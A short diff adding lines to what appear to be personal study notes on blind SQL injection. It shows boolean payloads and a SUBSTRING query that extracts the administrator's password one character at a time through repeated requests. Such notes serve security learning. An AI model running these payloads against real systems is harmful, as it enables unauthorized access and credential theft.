@@ -76,6 +76,9 @@ Force a true statement buy injectiong `' and 1=1--` (true) and `' and 1=2--` (fa
 `' and (select username from users where username='administrator' and LENGTH (password)>16)='administrator'--` flase
 ```
 
+2. Once you know the length of the password now you can quiere for characters in the same way buy submitting tons of request testing each letter/number/symbol untill you get a true response
+> Example: `' and (select substring(password,1,1) from users where username='administrator')='a'--` the subtring peramiter specifies where we want to test, what position in the string to test and how many characters we want to test.
+
 
 
 
